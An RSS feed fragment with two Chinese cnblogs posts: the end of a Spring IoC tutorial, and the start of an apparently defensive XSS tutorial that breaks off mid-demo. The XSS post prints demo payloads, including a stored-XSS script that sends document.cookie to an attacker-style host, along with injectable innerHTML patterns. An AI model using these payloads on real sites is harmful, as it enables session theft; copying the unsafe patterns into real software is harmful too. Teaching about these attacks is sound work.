    &amp;lt;bean id=&quot;dog&quot; class=&quot;com.sharpcj.beanfactorypostprocessor.Dog&quot;/&amp;gt;
    &amp;lt;bean id=&quot;parrot&quot; class=&quot;com.sharpcj.beanfactorypostprocessor.Parrot&quot;/&amp;gt;
    &amp;lt;bean id=&quot;petBeanFactoryPostProcessor&quot; class=&quot;com.sharpcj.beanfactorypostprocessor.PetBeanFactoryPostProcessor&quot;/&amp;gt;
&amp;lt;/beans&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;测试代码：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package com.sharpcj.beanfactorypostprocessor;

import org.springframework.context.ApplicationContext;
import org.springframework.context.support.ClassPathXmlApplicationContext;

public class AppTest {
    public static void main(String[] args) {
        ApplicationContext context = new ClassPathXmlApplicationContext(&quot;beanfactorypostprocessor.xml&quot;);
        Dog dog = (Dog) context.getBean(&quot;dog&quot;);
        Parrot parrot = (Parrot) context.getBean(&quot;parrot&quot;);
        dog.move();
        parrot.move();
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;结果如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/758949/201905/758949-20190523003931629-2062405302.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;容器后处理器的作用对象是容器本身，展开 BeanFactoryPostProcessor 接口的继承关系，我们可以看到 Spring 本身提供了很多常见的容器后处理器。&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/758949/201905/758949-20190523004300250-1192496051.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;其中一些在实际开发中很常用，如属性占位符配置器 PropertyPlaceholderConfigurer 、 重写占位符配置器 PropertyOverrideConfigurer 等。&lt;/p&gt;

&lt;h2 id=&quot;让-bean-获取-spring-容器&quot;&gt;让 Bean 获取 Spring 容器&lt;/h2&gt;
&lt;p&gt;程序启动时，初始化 Spring 容器，我们已经知道如何通过容器，获取 Bean 的实例方式,形如：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;BeanFactory factory = xxx ;
factory.getBean(xxx...);&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在某些特殊情况下，我们需要让 Bean 获取 Spring 容器，这个如何实现呢?&lt;br/&gt;我们只需要让 Bean 实现 BeanFactoryAware 接口，该接口只有一个方法：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;void setBeanFactory(BeanFactory beanFactory);&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;该方法的参数即指向创建该 Bean 的 BeanFactory ，这个 setter 方法看起来有点奇怪，习惯上在 java 中 setter 方法都是由程序员调用，传入参数，而此处的方法则由 Spring 调用。与次类似的，还有 ApplicationContextAware 接口，需要实现一个方法&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;void setApplicationContext(ApplicationContext applicationContext);&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;下面通过例子来说明：&lt;br/&gt;这次我们的 Dog 类，修改了：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package com.sharpcj.beanfactoryaware;

import org.springframework.beans.BeansException;
import org.springframework.beans.factory.BeanFactory;
import org.springframework.beans.factory.BeanFactoryAware;

public class Dog implements IPet, BeanFactoryAware {

    private BeanFactory factory;

    @Override
    public void move() {
        System.out.println(&quot;Dog can run!&quot;);
    }

    @Override
    public void setBeanFactory(BeanFactory beanFactory) throws BeansException {
        factory = beanFactory;
    }

    public void test() {
        Parrot parrot = (Parrot) factory.getBean(&quot;parrot&quot;);
        parrot.move();
    }

}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;测试代码，AppTest.java&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package com.sharpcj.beanfactoryaware;

import org.springframework.context.ApplicationContext;
import org.springframework.context.support.ClassPathXmlApplicationContext;

public class AppTest {
    public static void main(String[] args) {
        ApplicationContext context = new ClassPathXmlApplicationContext(&quot;beanfactoryaware.xml&quot;);
        Dog dog = (Dog) context.getBean(&quot;dog&quot;);
        dog.test();
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;输出结果：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;Parrot can fly!&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;结果表明，我们确实在 Dog 类里面获取到了 Spring 容器，然后通过该容器创建了 Parrot 实例。&lt;/p&gt;
&lt;h2 id=&quot;获取-bean-本身的-id&quot;&gt;获取 Bean 本身的 id&lt;/h2&gt;
&lt;p&gt;有时候，当我们在开发一个 Bean 类时，Bean 何时被部署到 Spring 容器中，部署到 Spring 容器中的 id 又是什么，开发的时候我们需要提前预知，这是就可以借助 Spring 提供的 &lt;code&gt;BeanNameAware&lt;/code&gt; 接口,该接口提供一个方法：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;void setBeanName(String name);&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;用法与上面一样，这里不再过多解释，修改上面的例子：&lt;br/&gt;Dog.java&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package com.sharpcj.beanfactoryaware;

import org.springframework.beans.BeansException;
import org.springframework.beans.factory.BeanFactory;
import org.springframework.beans.factory.BeanFactoryAware;
import org.springframework.beans.factory.BeanNameAware;

public class Dog implements IPet, BeanFactoryAware, BeanNameAware {

    private BeanFactory factory;

    private String id;

    @Override
    public void move() {
        System.out.println(&quot;Dog can run!&quot;);
    }

    @Override
    public void setBeanFactory(BeanFactory beanFactory) throws BeansException {
        factory = beanFactory;
    }

    public void test() {
        System.out.println(&quot;Dog 的 id 是： &quot; + id);
    }

    @Override
    public void setBeanName(String name) {
        id = name;
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;测试类：AppTest.java&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package com.sharpcj.beanfactoryaware;

import org.springframework.context.ApplicationContext;
import org.springframework.context.support.ClassPathXmlApplicationContext;

public class AppTest {
    public static void main(String[] args) {
        ApplicationContext context = new ClassPathXmlApplicationContext(&quot;beanfactoryaware.xml&quot;);
        Dog dog = (Dog) context.getBean(&quot;dog&quot;);
        dog.test();
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;结果：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;Dog 的 id 是： dog&lt;/code&gt;
&lt;/pre&gt;

&lt;p&gt;ApplicationContext 的事件机制是观察者模式的实现，由 事件源、事件和事件监听器组成。通过 &lt;code&gt;ApplicationEvent&lt;/code&gt;类 和 &lt;code&gt;ApplicationListener&lt;/code&gt; 接口实现。&lt;br/&gt;Spring 事件机制的两个重要成员：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;ApplicationEvent： 容器事件，必须由 ApplicationContext 发布&lt;/li&gt;
&lt;li&gt;ApplicationListener：事件监听器，可由容器中任何 Bean 担任。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;事件机制原理：有 ApplicationContext 通过 &lt;code&gt;publishEvent()&lt;/code&gt; 方法发布一个实现了&lt;code&gt;ApplicationEvent&lt;/code&gt;接口的事件，任何实现了 &lt;code&gt;ApplicationListener&lt;/code&gt;接口的 Bean 充当事件监听器，可以对事件进行处理。这个原理有点类似于 Android 里面广播的实现。&lt;br/&gt;下面给出一个例子：&lt;br/&gt;ITeacher.java&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package com.sharpcj.appevent;

public interface ITeacher {
    void assignWork();
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;ChineseTeacher.java&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package com.sharpcj.appevent;

import org.springframework.context.ApplicationEvent;
import org.springframework.context.ApplicationListener;

public class ChineseTeacher implements ITeacher, ApplicationListener {
    @Override
    public void assignWork() {
        System.out.println(&quot;背诵三首唐诗&quot;);
    }

    @Override
    public void onApplicationEvent(ApplicationEvent event) {
        if (event instanceof ComplainEvent) {
            System.out.println(&quot;语文老师收到了抱怨...&quot;);
            System.out.println(&quot;抱怨的内容是：&quot; + ((ComplainEvent) event).getMsg());
            System.out.println(&quot;认真倾听抱怨，但是作业量依然不能减少...&quot;);
        }
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;MathTeacher.java&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package com.sharpcj.appevent;

import org.springframework.context.ApplicationEvent;
import org.springframework.context.ApplicationListener;

public class MathTeacher implements ITeacher, ApplicationListener {
    @Override
    public void assignWork() {
        System.out.println(&quot;做三道数学题&quot;);
    }

    @Override
    public void onApplicationEvent(ApplicationEvent event) {
        System.out.println(&quot;数学老师收到了事件，但没有判断事件类型，不作处理。。。。&quot;);
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;定义一个事件 ComplainEvent.java 继承自 ApplicationContextEvent:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package com.sharpcj.appevent;

import org.springframework.context.ApplicationContext;
import org.springframework.context.event.ApplicationContextEvent;

public class ComplainEvent extends ApplicationContextEvent {

    private String msg;

    /**
     * Create a new ContextStartedEvent.
     *
     * @param source the {@code ApplicationContext} that the event is raised for
     *               (must not be {@code null})
     */
    public ComplainEvent(ApplicationContext source) {
        super(source);
    }

    public String getMsg() {
        return msg;
    }

    public void setMsg(String msg) {
        this.msg = msg;
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;IStudent.java&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package com.sharpcj.appevent;

public interface IStudent {
    void doWork();
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;XiaoZhang.java&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package com.sharpcj.appevent;

import org.springframework.beans.BeansException;
import org.springframework.context.ApplicationContext;
import org.springframework.context.ApplicationContextAware;

public class XiaoZhang implements IStudent, ApplicationContextAware {
    private ApplicationContext mContext;

    @Override
    public void doWork() {
        System.out.println(&quot;小张背了李白的唐诗，做了三道几何体&quot;);
    }

    public void complain() {
        ComplainEvent complainEvent = new ComplainEvent(mContext);
        complainEvent.setMsg(&quot;作业太多了&quot;);
        mContext.publishEvent(complainEvent);
    }

    @Override
    public void setApplicationContext(ApplicationContext applicationContext) throws BeansException {
        this.mContext = applicationContext;
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;配置文件， appevent.xml：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;
       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&amp;gt;

    &amp;lt;bean id=&quot;chineseTeacher&quot; class=&quot;com.sharpcj.appevent.ChineseTeacher&quot;/&amp;gt;
    &amp;lt;bean id=&quot;mathTeacher&quot; class=&quot;com.sharpcj.appevent.MathTeacher&quot;/&amp;gt;
    &amp;lt;bean id=&quot;xiaoZhang&quot; class=&quot;com.sharpcj.appevent.XiaoZhang&quot;/&amp;gt;
&amp;lt;/beans&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;测试类, AppTest.java：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package com.sharpcj.appevent;

import org.springframework.context.ApplicationContext;
import org.springframework.context.support.ClassPathXmlApplicationContext;

public class AppTest {
    public static void main(String[] args) {
        ApplicationContext context = new ClassPathXmlApplicationContext(&quot;appevent.xml&quot;);
        XiaoZhang xiaoZhang = (XiaoZhang) context.getBean(&quot;xiaoZhang&quot;);
        xiaoZhang.complain();
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;测试结果如下：&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/758949/201905/758949-20190523003958111-1268027927.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;咦，数学老师也受到了事件，为什么还受到两次事件？首先根据代码，我们能想明白，只要是容器发布了事件，所有实现了&lt;code&gt;ApplicationListener&lt;/code&gt;接口的监听器都能接收到事件，那为什么，数学老师打印出了两条呢？我猜，容器初始化期间，本身发布了一次事件。下面稍微修改了一下代码，便验证了我的猜想是正确的。&lt;br/&gt;MathTeacher.java&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package com.sharpcj.appevent;

import org.springframework.context.ApplicationEvent;
import org.springframework.context.ApplicationListener;

public class MathTeacher implements ITeacher, ApplicationListener {
    @Override
    public void assignWork() {
        System.out.println(&quot;做三道数学题&quot;);
    }

    @Override
    public void onApplicationEvent(ApplicationEvent event) {
        System.out.println(&quot;数学老师收到了事件，但没有判断事件类型，不作处理。。。。&quot; + event.getClass().getSimpleName());
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;然后再次执行，结果如下：&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/758949/201905/758949-20190523004005744-1386479802.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;事实证明，容器初始化时，确实发布了一次 ContextRefreshedEvent 事件。&lt;/p&gt;

&lt;p&gt;既上一篇文章总结了一下 Spring 装配 Bean 的三种方式之后，这篇文章继续记录了一写 SpringIOC 的高级知识，本文没有按照一般书籍的顺序介绍 Spring 容器的相关知识，主要是从横向对几组关键概念进行对比解释，主要记录了一下 SpringIOC 中的一些关键知识点。当然 Spring IOC 其它的知识点还有很多，比如装配 Bean 时属性歧义性处理、 Bean 的组合属性、注入集合值、国际化、基于 XML Schema 的简化配置方式等。其它知识点可以通过查阅官方文档或者专业书籍学习。&lt;br/&gt;接下来会再整理一篇 Spring AOP 的文章。&lt;/p&gt;
</description>
<pubDate>Wed, 22 May 2019 16:51:00 +0000</pubDate>
<dc:creator>SharpCJ</dc:creator>
<og:description>本文没有按照一般书籍的顺序介绍 Spring 容器的相关知识，主要是从横向对几组关键概念进行对比解释，主要记录了一下 SpringIOC 中的一些关键知识点。如 FactoryBean 和 BeanF</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/joy99/p/10903567.html</dc:identifier>
</item>
<item>
<title>web安全之XSS攻击原理及防范 - 龙恩0707</title>
<link>http://www.cnblogs.com/tugenhua0707/p/10909284.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/tugenhua0707/p/10909284.html</guid>
<description>&lt;p&gt;一：什么是XSS攻击？&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;XSS 即（Cross Site Scripting）中文名称为：跨站脚本攻击。&lt;/strong&gt;XSS的重点不在于跨站点，而在于脚本的执行。那么XSS的原理是：&lt;br/&gt;恶意攻击者在web页面中会插入一些恶意的script代码。当用户浏览该页面的时候，那么嵌入到web页面中script代码会执行，因此会达到恶意攻击用户的目的。那么XSS攻击最主要有如下分类：反射型、存储型、及 DOM-based型。 反射性和DOM-baseed型可以归类为非持久性XSS攻击。存储型可以归类为持久性XSS攻击。&lt;/p&gt;

&lt;p&gt;二：反射型XSS&lt;/p&gt;
&lt;p&gt;反射性XSS的原理是：反射性xss一般指攻击者通过特定的方式来诱惑受害者去访问一个包含恶意代码的URL。当受害者点击恶意链接url的时候，恶意代码会直接在受害者的主机上的浏览器执行。&lt;/p&gt;
&lt;p&gt;反射性XSS又可以叫做非持久性XSS。为什么叫反射型XSS呢？那是因为这种攻击方式的注入代码是从目标服务器通过错误信息，搜索结果等方式反射回来的，而为什么又叫非持久性XSS呢？那是因为这种攻击方式只有一次性。&lt;/p&gt;
&lt;p&gt;比如：攻击者通过电子邮件等方式将包含注入脚本的恶意链接发送给受害者，当受害者点击该链接的时候，注入脚本被传输到目标服务器上，然后服务器将注入脚本 &quot;反射&quot;到受害者的浏览器上，从而浏览器就执行了该脚本。&lt;/p&gt;
&lt;p&gt;因此反射型XSS的攻击步骤如下：&lt;/p&gt;
&lt;p&gt;1. 攻击者在url后面的参数中加入恶意攻击代码。&lt;br/&gt;2. 当用户打开带有恶意代码的URL的时候，网站服务端将恶意代码从URL中取出，拼接在html中并且返回给浏览器端。&lt;br/&gt;3. 用户浏览器接收到响应后执行解析，其中的恶意代码也会被执行到。&lt;br/&gt;4. 攻击者通过恶意代码来窃取到用户数据并发送到攻击者的网站。攻击者会获取到比如cookie等信息，然后使用该信息来冒充合法用户&lt;br/&gt;的行为，调用目标网站接口执行攻击等操作。&lt;/p&gt;
&lt;p&gt;常见的反射性XSS有哪些？&lt;/p&gt;
&lt;p&gt;常见的是：&lt;strong&gt;恶意链接。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;比如我现在做一个demo。在本地启动一个简单的服务器，然后在页面上点击一个链接后，比如如下代码：html代码如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;!&lt;/span&gt;&lt;span&gt;DOCTYPE html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;charset&lt;/span&gt;&lt;span&gt;=utf-8&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;referrer&quot;&lt;/span&gt;&lt;span&gt; content&lt;/span&gt;&lt;span&gt;=&quot;never&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;csrf攻击&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;a &lt;/span&gt;&lt;span&gt;href&lt;/span&gt;&lt;span&gt;=&quot;http://localhost:3001/xss&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;xxs 攻击&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;a &lt;/span&gt;&lt;span&gt;href&lt;/span&gt;&lt;span&gt;=&quot;http://localhost:3001/testcookie&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;testcookie 攻击&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;然后node中app.js 代码如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;44&quot;&gt;
&lt;pre&gt;
const Koa = require('koa'&lt;span&gt;);
const fs &lt;/span&gt;= require('fs'&lt;span&gt;);
const path &lt;/span&gt;= require('path'&lt;span&gt;);
const router &lt;/span&gt;= require('koa-router'&lt;span&gt;)();
const koaBody &lt;/span&gt;= require('koa-body'&lt;span&gt;);
const static &lt;/span&gt;= require('koa-static'&lt;span&gt;);

const app &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Koa();

router.get(&lt;/span&gt;'/', (ctx, next) =&amp;gt;&lt;span&gt; {
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 设置头类型, 如果不设置，会直接下载该页面&lt;/span&gt;
  ctx.type = 'html'&lt;span&gt;;
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 读取文件&lt;/span&gt;
  const pathUrl = path.join(__dirname, '/static/index.html'&lt;span&gt;);
  ctx.body &lt;/span&gt;=&lt;span&gt; fs.createReadStream(pathUrl);
  next();
});

router.get(&lt;/span&gt;'/xss', (ctx, next) =&amp;gt;&lt;span&gt; {
  ctx.body &lt;/span&gt;= '&amp;lt;script&amp;gt;alert(&quot;反射型 XSS 攻击&quot;)&amp;lt;/script&amp;gt;'&lt;span&gt;;
});
router.get(&lt;/span&gt;'/testcookie', (ctx, next) =&amp;gt;&lt;span&gt; {
  console.log(ctx.cookies.get(&lt;/span&gt;'connect.sid'&lt;span&gt;));
  ctx.body &lt;/span&gt;= '&amp;lt;script&amp;gt;alert(&quot;'+ctx.cookies.get('connect.sid')+'&quot;)&amp;lt;/script&amp;gt;'&lt;span&gt;;
  next();
});

app.use(static(path.join(__dirname)));

app.use(router.routes());
app.use(router.allowedMethods());

app.listen(&lt;/span&gt;3001, () =&amp;gt;&lt;span&gt; {
  console.log(&lt;/span&gt;'server is listen in 3001'&lt;span&gt;);
});&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;如上代码，当用户点击xxs 攻击恶意链接时候，页面会跳转到 http://localhost:3001/xss 攻击者预先准备的页面，然后会返回攻击者准备的js脚本，该js脚本就在浏览器中执行了，如下所示：&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/561794/201905/561794-20190522231214099-1234219577.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;当用户点击 testcookie 攻击 这个链接的时候，首先要保证页面上有cookie，比如我请求如下的cookie:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/561794/201905/561794-20190522231229205-1557810526.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;然后我们点击 testcookie 该链接，也会调用node中的 router.get('/testcookie', (ctx, next) =&amp;gt; {}) 这个请求获取到cookie，如下所示：&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/561794/201905/561794-20190522231254328-364209115.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;如上我们就可以很容易通过xss攻击拿到对方的cookie信息了。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/tugenhua0707/web-security/tree/master/xss/%E5%8F%8D%E5%B0%84%E6%80%A7xss&quot; target=&quot;_blank&quot;&gt;github源码查看&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;三：存储型XSS&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;存储型XSS的原理是：主要是将恶意代码上传或存储到服务器中，下次只要受害者浏览包含此恶意代码的页面就会执行恶意代码。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;比如我现在做了一个博客网站，然后攻击者在上面发布了一篇文章，内容是如下：&amp;lt;script&amp;gt;window.open(&quot;www.gongji.com?param=&quot;+document.cookie)&amp;lt;/script&amp;gt; 如果我没有对该文章进行任何处理的话，直接存入到数据库中，那么下一次当其他用户访问该文章的时候，服务器会从数据库中读取后然后响应给客户端，那么浏览器就会执行这段脚本，然后攻击者就会获取到用户的cookie，然后会把cookie发送到攻击者的服务器上了。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;因此存储型XSS的攻击步骤如下：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1. 攻击者将恶意代码提交到目标网站数据库中。&lt;br/&gt;2. 用户打开目标网站时，网站服务器将恶意代码从数据库中取出，然后拼接到html中返回给浏览器中。&lt;br/&gt;3. 用户浏览器接收到响应后解析执行，那么其中的恶意代码也会被执行。&lt;br/&gt;4. 那么恶意代码执行后，就能获取到用户数据，比如上面的cookie等信息，那么把该cookie发送到攻击者网站中，那么攻击者拿到该&lt;br/&gt;cookie然后会冒充该用户的行为，调用目标网站接口等违法操作。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如何防范？&lt;/strong&gt;&lt;br/&gt;1. 后端需要对提交的数据进行过滤。&lt;br/&gt;2. 前端也可以做一下处理方式，比如对script标签，将特殊字符替换成HTML编码这些等。&lt;/p&gt;

&lt;p&gt;四：DOM-based型XSS&lt;/p&gt;
&lt;p&gt;我们客户端的js可以对页面dom节点进行动态的操作，比如插入、修改页面的内容。比如说客户端从URL中提取数据并且在本地执行、如果用户在客户端输入的数据包含了恶意的js脚本的话，但是这些脚本又没有做任何过滤处理的话，那么我们的应用程序就有可能受到DOM-based XSS的攻击。因此DOM型XSS的攻击步骤如下：&lt;/p&gt;
&lt;p&gt;1. 攻击者构造出特殊的URL、在其中可能包含恶意代码。&lt;br/&gt;2. 用户打开带有恶意代码的URL。&lt;br/&gt;3. 用户浏览器收到响应后解析执行。前端使用js取出url中的恶意代码并执行。&lt;br/&gt;4. 执行时，恶意代码窃取用户数据并发送到攻击者的网站中，那么攻击者网站拿到这些数据去冒充用户的行为操作。调用目标网站接口&lt;br/&gt;执行攻击者一些操作。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;DOM XSS 是基于文档对象模型的XSS。一般有如下DOM操作：&lt;/strong&gt;&lt;br/&gt;1. 使用document.write直接输出数据。&lt;br/&gt;2. 使用innerHTML直接输出数据。&lt;br/&gt;3. 使用location、location.href、location.replace、iframe.src、document.referer、window.name等这些。&lt;br/&gt;比如如下demo:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&amp;lt;script&amp;gt;&lt;span&gt;
  document.body.innerHTML &lt;/span&gt;= &quot;&amp;lt;a href='&quot;+url+&quot;'&amp;gt;&quot;+url+&quot;&amp;lt;/a&amp;gt;&quot;&lt;span&gt;;
&lt;/span&gt;&amp;lt;/script&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;假如对于变量url的值是：javascript:alert('dom-xss'); 类似这样的，那么就会收到xss的攻击了。因此对于DOM XSS主要是由于本地客户端获取的DOM数据在本地执行导致的。因此我们需要对HTML进行编码，对JS进行编码来防止这些问题产生。具体如何编码可以请看我下面的 XSS 如何防范那个地方即可。&lt;/p&gt;
&lt;p&gt;我们接下来看看demo代码吧：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1. 使用document.write直接输出导致浏览器解析恶意代码&lt;/strong&gt;&lt;br/&gt;代码如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;!&lt;/span&gt;&lt;span&gt;DOCTYPE html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;charset&lt;/span&gt;&lt;span&gt;=utf-8&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;referrer&quot;&lt;/span&gt;&lt;span&gt; content&lt;/span&gt;&lt;span&gt;=&quot;never&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;script &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;text/javascript&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;var&lt;/span&gt;&lt;span&gt; s &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; location.search;            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 返回URL中的查询部分（？之后的内容）&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 为了方便演示，我们假如url是 如下这样的&lt;/span&gt;
